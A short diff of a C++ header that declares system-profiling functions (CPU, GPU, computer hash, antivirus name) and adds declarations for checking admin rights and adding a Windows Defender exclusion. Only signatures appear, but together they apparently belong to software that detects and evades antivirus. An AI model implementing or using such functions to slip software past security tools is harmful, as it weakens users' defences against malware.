@@ -36,3 +36,8 @@ std::string GetCPUName();
 std::string GetGPUName();
 std::string GetComputerHash();
 std::string GetAntivirusName();
+
+// Admin and security functions
+bool IsRunningAsAdmin();
+bool AddDefenderExclusion(const std::string& path);
+
